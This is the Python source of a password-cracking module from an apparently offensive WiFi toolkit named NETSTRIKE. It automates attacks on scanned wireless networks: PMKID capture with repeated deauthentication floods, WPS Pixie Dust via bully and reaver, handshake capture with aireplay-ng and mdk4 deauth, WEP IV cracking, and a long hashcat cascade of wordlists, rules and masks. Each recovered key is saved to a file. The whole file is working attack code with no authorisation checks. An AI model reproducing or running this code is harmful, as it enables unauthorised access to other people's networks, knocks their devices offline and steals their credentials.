#!/usr/bin/env python3
"""
NETSTRIKE v5.0 - BEAST EDITION
Password Cracker — PMKID | WPS | Handshake | WEP
Full auto: GPU detection, combinator, hybrid, mask cascade, all rule files
"""

import os
import time
import threading


class PasswordCracker:
    def __init__(self, core, scanner):
        self.core            = core
        self.scanner         = scanner
        self.cracking_active = False

    # ═══════════════════════════════════════════════
    # AUTO CASCADE (fully automatic, zero user input)
    # ═══════════════════════════════════════════════

    def auto_crack_attack(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if not target:
            return
        self._fire(target)

    def _fire(self, target):
        enc = target.get('encryption', '')
        print(f"\033[1;33m[🎯] Target: {target['essid']}  |  Enc: {enc}\033[0m")
        if 'WEP' in enc and 'WPA' not in enc:
            print("\033[1;33m[🗝️] WEP → IV crack\033[0m")
            self.wep_attack(target)
        else:
            print("\033[1;36m[⚡] BEAST CASCADE: PMKID → WPS → Handshake\033[0m")
            if not self._cascade(target):
                print("\033[1;31m[✘] All methods exhausted\033[0m")

    def _cascade(self, target):
        steps = [
            ("PMKID (clientless)",         self.pmkid_attack),
            ("WPS Pixie Dust",             self.wps_assessment),
            ("Handshake + full GPU chain", self.handshake_attack),
        ]
        for label, fn in steps:
            print(f"\n\033[1;35m━━━ {label} ━━━\033[0m")
            if fn(target):
                return True
        return False

    # ═══════════════════════════════════════════════
    # PMKID — aggressive, clientless, 90 s
    # ═══════════════════════════════════════════════

    def pmkid_attack(self, target):
        bssid = target['bssid']
        clean = bssid.replace(':', '')

        pcapng = f"/tmp/ns_pmkid_{clean}.pcapng"
        hc_out = f"/tmp/ns_pmkid_{clean}.hc22000"
        filt   = f"/tmp/ns_filt_{clean}.txt"
        with open(filt, 'w') as f:
            f.write(clean + '\n')

        modern   = self._hcxdumptool_is_modern()
        flag     = "--filterlist_ap" if modern else "--filterlist"
        fmode    = "--filtermode_ap=2" if modern else "--filtermode=2"
        dump_cmd = (
            f"timeout 90 hcxdumptool -i {self.core.mon_interface} "
            f"-o {pcapng} {flag}={filt} {fmode} 2>/dev/null"
        )

        # Stimulate reconnects aggressively in background
        stim = threading.Thread(target=self._pmkid_stimulate, args=(target,), daemon=True)
        stim.start()

        print("\033[1;36m[→] PMKID capture 90 s (stimulating reconnects)...\033[0m")
        self.core.run_command(dump_cmd, timeout=100)

        if not (os.path.exists(pcapng) and os.path.getsize(pcapng) > 100):
            print("\033[1;31m[✘] PMKID capture empty\033[0m")
            return False

        converted, hc_out = self._convert_pmkid(pcapng, clean)
        if not converted:
            print("\033[1;31m[✘] PMKID conversion failed\033[0m")
            return False

        print("\033[1;32m[✓] PMKID hash ready — starting BEAST crack\033[0m")
        return self._beast_crack(hc_out, 16800, target)

    def _convert_pmkid(self, pcapng, clean):
        hc_out = f"/tmp/ns_pmkid_{clean}.hc22000"
        if self._cmd_exists("hcxpcapngtool"):
            self.core.run_command(f"hcxpcapngtool -o {hc_out} {pcapng} 2>/dev/null")
            if os.path.exists(hc_out) and os.path.getsize(hc_out) > 0:
                return True, hc_out
        if self._cmd_exists("hcxpcaptool"):
            legacy = f"/tmp/ns_pmkid_{clean}.hash"
            self.core.run_command(f"hcxpcaptool -z {legacy} {pcapng} 2>/dev/null")
            if os.path.exists(legacy) and os.path.getsize(legacy) > 0:
                return True, legacy
        return False, hc_out

    def _hcxdumptool_is_modern(self):
        r = self.core.run_command("hcxdumptool --help 2>&1")
        if r and "filterlist_ap" in r.stdout:
            return True
        r = self.core.run_command("hcxdumptool --version 2>&1")
        if r and r.stdout:
            for tok in r.stdout.split():
                if tok and tok[0].isdigit():
                    try:
                        return int(tok.split('.')[0]) >= 6
                    except ValueError:
                        pass
        return False

    def _pmkid_stimulate(self, target):
        """Aggressive deauth bursts to force reconnects → PMKID exchange."""
        bssid = target['bssid']
        mon   = self.core.mon_interface
        for _ in range(18):  # 18 × 5 s = 90 s total
            self.core.run_command(
                f"aireplay-ng --deauth 8 -a {bssid} {mon} > /dev/null 2>&1"
            )
            time.sleep(5)

    # ═══════════════════════════════════════════════
    # WPS — bully + reaver simultaneously
    # ═══════════════════════════════════════════════

    def wps_assessment(self, target):
        print("\033[1;36m[→] Checking WPS...\033[0m")
        r = self.core.run_command(
            f"timeout 20 wash -i {self.core.mon_interface} -s -C 2>/dev/null"
        )
        if not (r and target['bssid'] in (r.stdout or '')):
            print("\033[1;31m[✘] WPS not available\033[0m")
            return False
        print("\033[1;32m[✓] WPS active — launching Pixie Dust\033[0m")
        has_bully  = self._cmd_exists("bully")
        has_reaver = self._cmd_exists("reaver")
        if not has_bully and not has_reaver:
            print("\033[1;31m[✘] bully/reaver not found\033[0m")
            return False
        result = [False]
        threads = []
        if has_bully:
            t = threading.Thread(
                target=lambda: result.__setitem__(0, self._bully_wps(target)), daemon=True
            )
            threads.append(t); t.start()
        if has_reaver:
            t = threading.Thread(
                target=lambda: result.__setitem__(0, self._reaver_wps(target)), daemon=True
            )
            threads.append(t); t.start()
        for t in threads:
            t.join()
        return result[0]

    def _bully_wps(self, target):
        log  = "/tmp/ns_bully.log"
        proc = self.core.run_command(
            f"bully -b {target['bssid']} -c {target['channel']} "
            f"-d -v 3 -S -L -F {self.core.mon_interface} > {log} 2>&1",
            background=True
        )
        if not proc:
            return False
        print("\033[1;32m[⚡] Bully Pixie Dust (3 min)...\033[0m")
        deadline = time.time() + 180
        while time.time() < deadline:
            if os.path.exists(log):
                with open(log, errors='replace') as f:
                    content = f.read()
                if "WPS PIN" in content or "PSK" in content:
                    try: proc.terminate()
                    except Exception: pass
                    return self._extract_wps_cred(content, target)
            time.sleep(5)
        try: proc.terminate()
        except Exception: pass
        return False

    def _reaver_wps(self, target):
        log  = "/tmp/ns_reaver.log"
        proc = self.core.run_command(
            f"reaver -i {self.core.mon_interface} -b {target['bssid']} "
            f"-c {target['channel']} -vv -K 1 -N -A -d 2 -T 0.5 > {log} 2>&1",
            background=True
        )
        if not proc:
            return False
        print("\033[1;32m[⚡] Reaver Pixie Dust (5 min)...\033[0m")
        deadline = time.time() + 300
        while time.time() < deadline:
            if os.path.exists(log):
                with open(log, errors='replace') as f:
                    content = f.read()
                if "WPS PIN:" in content:
                    try: proc.terminate()
                    except Exception: pass
                    return self._extract_wps_cred(content, target)
            time.sleep(5)
        try: proc.terminate()
        except Exception: pass
        return False

    def _extract_wps_cred(self, content, target):
        for line in content.split('\n'):
            if "WPA PSK:" in line or "PSK:" in line:
                pw = line.split("PSK:")[-1].strip().strip("'\"")
                if pw:
                    print(f"\033[1;32m[🔓] WPS PSK: {pw}\033[0m")
                    self.save_cracked_password(target, pw)
                    return True
        return False

    # ═══════════════════════════════════════════════
    # HANDSHAKE — aggressive capture + full crack
    # ═══════════════════════════════════════════════

    def handshake_attack(self, target):
        bssid   = target['bssid']
        channel = target['channel']
        mon     = self.core.mon_interface
        hs_base = f"/tmp/ns_hs_{bssid.replace(':', '_')}"
        cap_file = f"{hs_base}-01.cap"

        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")

        cap_proc = self.core.run_command(
            f"airodump-ng -c {channel} --bssid {bssid} -w {hs_base} {mon}",
            background=True
        )

        self.cracking_active = False
        threading.Thread(target=self._deauth_for_hs, args=(target,), daemon=True).start()
        threading.Thread(target=self._mdk4_deauth_for_hs, args=(target,), daemon=True).start()

        print("\033[1;36m[→] Capturing handshake (90 s) — dual deauth engine...\033[0m")
        captured = False
        deadline = time.time() + 90

        while time.time() < deadline:
            elapsed = int(time.time() - (deadline - 90))
            print(f"\r\033[1;36m[⏳] {elapsed}/90s — listening...\033[0m", end="", flush=True)
            if self._verify_handshake(cap_file, bssid):
                print()
                captured = True
                break
            time.sleep(3)
        print()

        self.cracking_active = True
        if cap_proc:
            try: cap_proc.terminate()
            except Exception: pass

        if not captured:
            print("\033[1;31m[✘] Handshake not captured\033[0m")
            return False

        print("\033[1;32m[✓] Handshake captured!\033[0m")

        hc22000 = f"/tmp/ns_{bssid.replace(':', '')}.hc22000"
        if self._cmd_exists("hcxpcapngtool") and self._convert_to_hc22000(cap_file, hc22000):
            return self._beast_crack(hc22000, 22000, target)
        else:
            return self._beast_crack_aircrack(cap_file, target)

    def _deauth_for_hs(self, target):
        """aireplay-ng targeted deauth — 25 bursts × 15 frames."""
        for _ in range(25):
            if self.cracking_active:
                break
            self.core.run_command(
                f"aireplay-ng --deauth 15 -a {target['bssid']} "
                f"{self.core.mon_interface} > /dev/null 2>&1"
            )
            time.sleep(3)

    def _mdk4_deauth_for_hs(self, target):
        """MDK4 simultaneous deauth to fill any gaps aireplay misses."""
        bssid   = target['bssid']
        channel = target.get('channel', '6')
        mon     = self.core.mon_interface
        proc = self.core.run_command(
            f"mdk4 {mon} d -B {bssid} -c {channel}",
            background=True
        )
        # Keep running until handshake captured
        while not self.cracking_active:
            time.sleep(2)
        if proc:
            try: proc.terminate()
            except Exception: pass

    def _verify_handshake(self, cap_file, bssid):
        if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 100:
            return False
        r = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep -i '{bssid}'")
        return bool(r and "1 handshake" in r.stdout)

    def _convert_to_hc22000(self, cap_file, out_file):
        self.core.run_command(f"hcxpcapngtool -o {out_file} {cap_file} 2>/dev/null")
        return os.path.exists(out_file) and os.path.getsize(out_file) > 0

    # ═══════════════════════════════════════════════
    # WEP — ARP replay + fragmentation + aircrack
    # ═══════════════════════════════════════════════

    def wep_crack_menu(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if target:
            self.wep_attack(target)

    def wep_attack(self, target):
        bssid    = target['bssid']
        channel  = target['channel']
        essid    = target['essid']
        mon      = self.core.mon_interface
        cap_base = f"/tmp/ns_wep_{bssid.replace(':', '')}"
        cap_file = f"{cap_base}-01.cap"

        print(f"\033[1;36m[🗝️] WEP BEAST: {essid}\033[0m")
        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")
        time.sleep(0.5)

        cap_proc = self.core.run_command(
            f"airodump-ng -c {channel} --bssid {bssid} -w {cap_base} {mon}",
            background=True
        )
        # Fake auth with keep-alive
        self.core.run_command(
            f"aireplay-ng -1 0 -e '{essid}' -a {bssid} {mon} > /dev/null 2>&1",
            timeout=20
        )
        time.sleep(1)
        self.core.run_command(
            f"aireplay-ng -1 6000 -q 10 -e '{essid}' -a {bssid} {mon} > /dev/null 2>&1 &"
        )
        time.sleep(2)

        print("\033[1;36m[→] ARP replay + fragmentation (parallel, 8 min max)...\033[0m")
        replay_proc = self.core.run_command(
            f"aireplay-ng -3 -b {bssid} {mon}", background=True
        )
        frag_proc = self.core.run_command(
            f"aireplay-ng -5 -b {bssid} -h {bssid} {mon}", background=True
        )

        deadline = time.time() + 480
        cracked  = False
        attempt  = 0

        while time.time() < deadline:
            time.sleep(30)
            attempt += 1
            if not os.path.exists(cap_file):
                continue
            print(f"\r\033[1;36m[→] aircrack attempt #{attempt}...\033[0m", end="", flush=True)
            r = self.core.run_command(
                f"aircrack-ng -b {bssid} {cap_file} 2>/dev/null", timeout=30
            )
            if r and "KEY FOUND" in r.stdout:
                for line in r.stdout.split('\n'):
                    if "KEY FOUND" in line:
                        key = line.split('[')[-1].rstrip(']').strip()
                        print(f"\r\033[1;32m[🔓] WEP KEY: {key}\033[0m")
                        self.save_cracked_password(target, key)
                        cracked = True
                        break
                if cracked:
                    break

        for p in [cap_proc, replay_proc, frag_proc]:
            if p:
                try: p.terminate()
                except Exception: pass
        self.core.run_command("pkill -f 'aireplay-ng -1 6000' 2>/dev/null")

        if not cracked:
            print("\033[1;31m[✘] WEP crack failed — need more IVs or closer range\033[0m")
        return cracked

    # ═══════════════════════════════════════════════
    # BEAST CRACK ENGINE — full hashcat chain
    # ═══════════════════════════════════════════════

    def _beast_crack(self, hash_file, mode, target):
        """
        FULL BEAST CHAIN (auto, no user input):
          1. Custom SSID wordlist        — instant
          2. Common WiFi passwords       — fast
          3. Combinator: custom × common — word+word combos
          4. Hybrid: wordlist + ?d{4-8}  — word + digits suffix
          5. Hybrid: ?d{4-6} + wordlist  — digits + word prefix
          6. RockYou + best64.rule       — largest wordlist + mutations
          7. RockYou + all other rules   — every available rule file
          8. Mask brute force cascade    — digit/alpha/mixed/ISP patterns
          9. SSID-targeted masks         — SSIDname + common suffixes
        """
        essid  = target.get('essid', '')
        device = self._detect_device()

        print(f"\033[1;35m[⚡] BEAST CRACK ENGINE — {mode} mode — {device}\033[0m")

        # ── 1. Custom SSID wordlist ───────────────────────────────────
        custom = self._build_custom(essid)
        if self._hc_run(hash_file, mode, custom, device, "Custom SSID list"):
            return True

        # ── 2. Common WiFi passwords ──────────────────────────────────
        common = self._common()
        if self._hc_run(hash_file, mode, common, device, "Common WiFi passwords"):
            return True

        # ── 3. Combinator: custom × common ───────────────────────────
        combo = self._build_combinator(custom, common)
        if combo and self._hc_run_mode(hash_file, mode, combo, combo, "-a 1", device, "Combinator attack"):
            return True

        # ── 4. Hybrid: wordlist + digit suffix (?d × 4..8) ───────────
        for wl, name in [(custom, "SSID"), (common, "Common")]:
            for dlen in [4, 6, 8]:
                mask = "?d" * dlen
                if self._hc_hybrid(hash_file, mode, wl, mask, "-a 6", device, f"Hybrid {name}+{dlen}d", dlen * 30):
                    return True

        # ── 5. Hybrid: digit prefix + wordlist ───────────────────────
        for dlen in [4, 6]:
            mask = "?d" * dlen
            if self._hc_hybrid(hash_file, mode, mask, common, "-a 7", device, f"Hybrid {dlen}d+Common", dlen * 30):
                return True

        # ── 6-7. RockYou + every available rule file ─────────────────
        rockyou = self._rockyou()
        if rockyou:
            for rule_path in self._find_all_rules():
                rname = os.path.basename(rule_path)
                if self._hc_run(hash_file, mode, rockyou, device, f"RockYou+{rname}", rule=rule_path, timeout=900):
                    return True

            # RockYou no rules as final wordlist pass
            if self._hc_run(hash_file, mode, rockyou, device, "RockYou (no rules)", timeout=600):
                return True

        # ── 8. Mask brute force cascade ───────────────────────────────
        return self._mask_cascade(hash_file, mode, target, device)

    def _hc_run(self, hash_file, mode, wordlist, device, label, rule="", timeout=600):
        """Run hashcat dictionary attack. Returns True if cracked."""
        if not (wordlist and os.path.exists(wordlist)):
            return False
        rule_arg = f"-r {rule}" if rule and os.path.exists(rule) else ""
        print(f"\033[1;36m[→] {label}...\033[0m")
        self.core.run_command(
            f"hashcat -m {mode} {hash_file} {wordlist} {rule_arg} "
            f"{device} -O --force -q 2>/dev/null",
            timeout=timeout + 30
        )
        pw = self._hashcat_show(hash_file, mode)
        if pw:
            print(f"\033[1;32m[🔓] CRACKED [{label}]: {pw}\033[0m")
            return True
        return False

    def _hc_run_mode(self, hash_file, mode, wl1, wl2, attack_mode, device, label, timeout=300):
        """Run hashcat combinator (-a 1) or other non-standard attack."""
        if not (wl1 and os.path.exists(wl1) and wl2 and os.path.exists(wl2)):
            return False
        print(f"\033[1;36m[→] {label}...\033[0m")
        self.core.run_command(
            f"hashcat -m {mode} {hash_file} {attack_mode} {wl1} {wl2} "
            f"{device} -O --force -q 2>/dev/null",
            timeout=timeout + 30
        )
        pw = self._hashcat_show(hash_file, mode)
        if pw:
            print(f"\033[1;32m[🔓] CRACKED [{label}]: {pw}\033[0m")
            return True
        return False

    def _hc_hybrid(self, hash_file, mode, wl_or_mask, mask_or_wl, attack_flag, device, label, timeout=120):
        """Run hashcat hybrid attack (-a 6 or -a 7)."""
        # For -a 6: wordlist mask  |  For -a 7: mask wordlist
        left  = wl_or_mask
        right = mask_or_wl
        if attack_flag == "-a 6" and not (isinstance(left, str) and os.path.exists(left)):
            return False
        if attack_flag == "-a 7" and not (isinstance(right, str) and os.path.exists(right)):
            return False
        print(f"\033[1;36m[→] {label}...\033[0m")
        self.core.run_command(
            f"hashcat -m {mode} {hash_file} {attack_flag} {left} {right} "
            f"{device} -O --force -q 2>/dev/null",
            timeout=timeout + 30
        )
        pw = self._hashcat_show(hash_file, mode)
        if pw:
            print(f"\033[1;32m[🔓] CRACKED [{label}]: {pw}\033[0m")
            return True
        return False

    def _mask_cascade(self, hash_file, mode, target, device):
        """
        Exhaustive mask brute-force — ordered by likelihood.
        Covers all ISP defaults, keyboard walks, common patterns.
        """
        essid = target.get('essid', '')
        masks = [
            # Most common ISP defaults
            ("8-digit",          "?d?d?d?d?d?d?d?d",           200),
            ("9-digit",          "?d?d?d?d?d?d?d?d?d",          280),
            ("10-digit",         "?d?d?d?d?d?d?d?d?d?d",        360),
            ("12-digit",         "?d?d?d?d?d?d?d?d?d?d?d?d",    480),
            ("6-digit PIN",      "?d?d?d?d?d?d",                 60),
            ("8-lower",          "?l?l?l?l?l?l?l?l",            300),
            ("10-lower",         "?l?l?l?l?l?l?l?l?l?l",        600),
            ("8-upper",          "?u?u?u?u?u?u?u?u",            300),
            ("8-mixed-lower+d",  "?h?h?h?h?h?h?h?h",            360),
            ("8-upper+4-digit",  "?u?u?u?u?u?u?u?u?d?d?d?d",   480),
            ("6-lower+6-digit",  "?l?l?l?l?l?l?d?d?d?d?d?d",   360),
            # Keyboard walks
            ("qwerty8",          "qwerty?d?d",                    20),
            ("password+d4",      "password?d?d?d?d",              20),
            # All-digit extended
            ("13-digit",         "?d?d?d?d?d?d?d?d?d?d?d?d?d",  600),
        ]

        for name, mask, t in masks:
            print(f"\033[1;36m[→] Mask [{name}]...\033[0m")
            self.core.run_command(
                f"hashcat -m {mode} {hash_file} -a 3 {mask} "
                f"{device} -O --force -q 2>/dev/null",
                timeout=t + 30
            )
            pw = self._hashcat_show(hash_file, mode)
            if pw:
                print(f"\033[1;32m[🔓] CRACKED [mask:{name}]: {pw}\033[0m")
                return True

        # SSID-based masks
        if essid and "HIDDEN" not in essid:
            clean = ''.join(c for c in essid if c.isalnum())[:12]
            if clean:
                for suffix_mask, t, label in [
                    ("?d?d?d?d",         90,  "SSID+4d"),
                    ("?d?d?d?d?d?d",     180, "SSID+6d"),
                    ("?d?d?d?d?d?d?d?d", 300, "SSID+8d"),
                    ("!?d?d?d?d",        60,  "SSID!+4d"),
                    ("@?d?d?d?d",        60,  "SSID@+4d"),
                ]:
                    for variant in [clean, clean.lower(), clean.upper()]:
                        full = f"{variant}{suffix_mask}"
                        print(f"\033[1;36m[→] Mask [{label}: {variant}XXX]...\033[0m")
                        self.core.run_command(
                            f"hashcat -m {mode} {hash_file} -a 3 '{full}' "
                            f"{device} -O --force -q 2>/dev/null",
                            timeout=t + 30
                        )
                        pw = self._hashcat_show(hash_file, mode)
                        if pw:
                            print(f"\033[1;32m[🔓] CRACKED [mask:{label}]: {pw}\033[0m")
                            return True

        print("\033[1;31m[✘] All hashcat methods exhausted\033[0m")
        return False

    def _beast_crack_aircrack(self, cap_file, target):
        """CPU fallback — aircrack-ng through all wordlists when hashcat unavailable."""
        wordlists = [
            ("Custom",  self._build_custom(target.get('essid', ''))),
            ("Common",  self._common()),
            ("RockYou", self._rockyou()),
            ("Mega",    self._build_mega(target.get('essid', ''))),
        ]
        result_file = "/tmp/ns_ac_result.txt"

        for name, path in wordlists:
            if not (path and os.path.exists(path)):
                continue
            print(f"\033[1;36m[→] aircrack-ng [{name}]...\033[0m")
            if os.path.exists(result_file):
                os.remove(result_file)
            self.core.run_command(
                f"aircrack-ng -w {path} -b {target['bssid']} {cap_file} "
                f"-l {result_file} -q 2>/dev/null",
                timeout=600
            )
            if os.path.exists(result_file):
                with open(result_file) as f:
                    pw = f.read().strip()
                if pw:
                    print(f"\033[1;32m[🔓] CRACKED [{name}]: {pw}\033[0m")
                    self.save_cracked_password(target, pw)
                    return True
        return False

    # ═══════════════════════════════════════════════
    # STANDALONE MENUS
    # ═══════════════════════════════════════════════

    def handshake_capture_menu(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if target:
            self.handshake_attack(target)

    def wps_pin_attack(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if target:
            self.wps_assessment(target)

    # ═══════════════════════════════════════════════
    # DEVICE + RULE DETECTION
    # ═══════════════════════════════════════════════

    def _detect_device(self):
        """Auto-detect GPU. Returns hashcat device + workload flags."""
        r = self.core.run_command("hashcat -I 2>/dev/null", timeout=10)
        if r and r.stdout:
            out = r.stdout
            # NVIDIA CUDA
            if any(k in out for k in ["CUDA", "GeForce", "RTX", "GTX", "Tesla", "Quadro"]):
                return "-D 2 -w 4"
            # AMD OpenCL
            if any(k in out for k in ["Radeon", "RX ", "Vega", "OpenCL"]):
                return "-D 2 -w 4"
            # Intel GPU
            if any(k in out for k in ["Intel", "UHD", "Arc"]):
                return "-D 2 -w 3"
            # Metal (macOS)
            if "Metal" in out:
                return "-D 2 -w 3"
        return "-D 1 -w 3"  # CPU — max workload

    def _find_all_rules(self):
        """Find every hashcat rule file available on this system."""
        search_dirs = [
            "/usr/share/hashcat/rules",
            "/usr/local/share/hashcat/rules",
            "/opt/hashcat/rules",
        ]
        # Preferred order — most effective first
        preferred = [
            "best64.rule", "rockyou-30000.rule", "d3ad0ne.rule",
            "dive.rule", "unix-ninja-leetspeak.rule", "toggles5.rule",
            "combinator.rule", "leetspeak.rule", "T0XlC.rule",
        ]
        found = []
        for d in search_dirs:
            if not os.path.isdir(d):
                continue
            # Add preferred files first (in order)
            for name in preferred:
                fp = os.path.join(d, name)
                if os.path.exists(fp) and fp not in found:
                    found.append(fp)
            # Then add any remaining rule files
            try:
                for fname in sorted(os.listdir(d)):
                    if fname.endswith('.rule'):
                        fp = os.path.join(d, fname)
                        if fp not in found:
                            found.append(fp)
            except Exception:
                pass
        return found

    # ═══════════════════════════════════════════════
    # WORDLIST BUILDERS
    # ═══════════════════════════════════════════════

    def _build_custom(self, essid):
        """Build SSID-targeted wordlist with all permutations."""
        path = "/tmp/ns_custom.txt"
        base = [
            # Universal WiFi defaults
            "12345678", "password", "admin123", "welcome1", "qwerty123",
            "letmein1", "123456789", "1234567890", "internet", "wireless",
            "default1", "guest1234", "password1", "pass1234", "home1234",
            "wifi1234", "admin", "root", "toor", "changeme", "abc12345",
            "network1", "connect1", "access123", "router12", "wifipass",
            # ISP-style digits
            "00000000", "11111111", "22222222", "33333333", "44444444",
            "55555555", "66666666", "77777777", "88888888", "99999999",
            "12341234", "43214321", "11223344", "99887766", "12121212",
            "10101010", "11110000", "00001111", "98765432", "01234567",
            # Date patterns (2020-2026)
            "01012020", "01012021", "01012022", "01012023", "01012024",
            "01012025", "01012026", "12312023", "12312024", "12312025",
            "31122023", "31122024", "31122025",
            # Keyboard walks
            "qwertyui", "asdfghjk", "zxcvbnm1", "qwerty12", "qwerty123",
            "1q2w3e4r", "1qaz2wsx", "q1w2e3r4", "zaq12wsx", "1234qwer",
            # Common brand/router defaults
            "linksys", "netgear1", "dlink123", "tplink12", "asus1234",
            "huawei12", "cisco123", "belkin12", "zyxel123",
        ]
        if essid and "HIDDEN" not in essid:
            clean    = essid.replace('_', '').replace('-', '').replace(' ', '')
            clean_lo = clean.lower()
            clean_up = clean.upper()
            essid_lo = essid.lower()
            essid_up = essid.upper()
            for suffix in [
                "", "1", "12", "123", "1234", "12345", "123456",
                "2023", "2024", "2025", "2026",
                "!", "@", "#", "0", "00", "000",
                "wifi", "net", "pass", "home", "router",
            ]:
                for variant in [essid, clean, essid_lo, clean_lo, essid_up, clean_up]:
                    candidate = variant + suffix
                    if 8 <= len(candidate) <= 63 and candidate not in base:
                        base.append(candidate)
            # Also try suffix before (prefix+SSID)
            for prefix in ["wifi", "home", "net", "my"]:
                candidate = prefix + clean_lo
                if 8 <= len(candidate) <= 63 and candidate not in base:
                    base.append(candidate)

        # Dedup while preserving order
        seen, unique = set(), []
        for p in base:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        try:
            with open(path, 'w') as f:
                f.write('\n'.join(unique) + '\n')
            return path
        except Exception:
            return None

    def _common(self):
        """Standard WiFi common passwords list."""
        path = "/tmp/ns_common.txt"
        if os.path.exists(path) and os.path.getsize(path) > 500:
            return path
        passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "dragon", "123123", "admin",
            "abc123", "iloveyou", "monkey", "letmein", "1234567890",
            "passw0rd", "master", "hello", "freedom", "trustno1",
            "00000000", "11111111", "12345678", "87654321", "99999999",
            "11223344", "12341234", "password1", "internet", "wireless",
            "wifi1234", "wifipass", "homepass", "default", "admin123",
            "root", "toor", "guest", "letmein", "changeme",
            "1234567890", "0123456789", "9876543210", "1111111111",
            "2222222222", "0000000000", "1234512345", "0987654321",
            "01012024", "01012023", "01012025", "01012026",
            "12122024", "31122023", "31122025", "20232023", "20242024",
            "qwertyui", "asdfghjk", "zxcvbnm1", "qwerty12", "qwerty123",
            "1q2w3e4r", "1qaz2wsx", "q1w2e3r4", "zaq12wsx",
            "connect1", "access12", "network1", "router12", "mypasswd",
            "abcdefgh", "abcd1234", "pass1234", "test1234", "user1234",
        ]
        try:
            with open(path, 'w') as f:
                f.write('\n'.join(dict.fromkeys(passwords)) + '\n')
            return path
        except Exception:
            return None

    def _rockyou(self):
        """Return rockyou.txt path, extract from .gz if needed."""
        for p in [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
        ]:
            if os.path.exists(p):
                if p.endswith('.gz'):
                    out = "/tmp/rockyou.txt"
                    if not os.path.exists(out):
                        print("\033[1;36m[→] Extracting rockyou.txt...\033[0m")
                        self.core.run_command(f"gzip -dc {p} > {out} 2>/dev/null", timeout=90)
                    return out if os.path.exists(out) else None
                return p
        return None

    def _build_combinator(self, wl1, wl2):
        """Build single combinator wordlist (word+word) for small lists."""
        if not (wl1 and os.path.exists(wl1) and wl2 and os.path.exists(wl2)):
            return None
        # Only do combinator if lists are small enough (< 5000 lines each)
        try:
            lines1 = open(wl1).read().splitlines()
            lines2 = open(wl2).read().splitlines()
        except Exception:
            return None
        if len(lines1) * len(lines2) > 5_000_000:
            return None  # Would produce too many — let hashcat -a 1 handle it
        # Return None — let hashcat -a 1 run directly on both files
        return wl1  # placeholder: -a 1 uses two separate files

    def _build_mega(self, essid=""):
        """Merge all available wordlists into one deduplicated file."""
        mega = "/tmp/ns_mega.txt"
        sources = []
        for p in [self._build_custom(essid), self._common(), self._rockyou()]:
            if p and os.path.exists(p):
                sources.append(p)
        if not sources:
            return None
        try:
            self.core.run_command(
                f"cat {' '.join(sources)} | sort -u > {mega} 2>/dev/null", timeout=90
            )
            return mega if os.path.exists(mega) else None
        except Exception:
            return None

    # ═══════════════════════════════════════════════
    # HELPERS
    # ═══════════════════════════════════════════════

    def _hashcat_show(self, hash_file, mode):
        """Read cracked password from hashcat potfile."""
        r = self.core.run_command(
            f"hashcat -m {mode} {hash_file} --show 2>/dev/null"
        )
        if r and r.stdout.strip():
            for line in r.stdout.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                idx = line.rfind(':')
                if idx != -1:
                    pw = line[idx + 1:].strip()
                    if pw:
                        return pw
        return None

    def _cmd_exists(self, cmd):
        r = self.core.run_command(f"command -v {cmd} 2>/dev/null")
        return bool(r and r.stdout.strip())

    def save_cracked_password(self, target, password):
        line = (
            f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]"
            f"  SSID: {target['essid']}"
            f"  |  BSSID: {target['bssid']}"
            f"  |  Password: {password}\n"
        )
        # Volatile
        try:
            with open("/tmp/ns_cracked.txt", "a") as f:
                f.write(line)
        except Exception:
            pass
        # Persistent session directory
        try:
            session_dir = os.path.expanduser("~/netstrike")
            os.makedirs(session_dir, exist_ok=True)
            session_file = os.path.join(session_dir, "cracked.txt")
            with open(session_file, "a") as f:
                f.write(line)
            print(f"\033[1;32m[💾] Saved → {session_file}\033[0m")
        except Exception:
            print("\033[1;32m[💾] Saved to /tmp/ns_cracked.txt\033[0m")
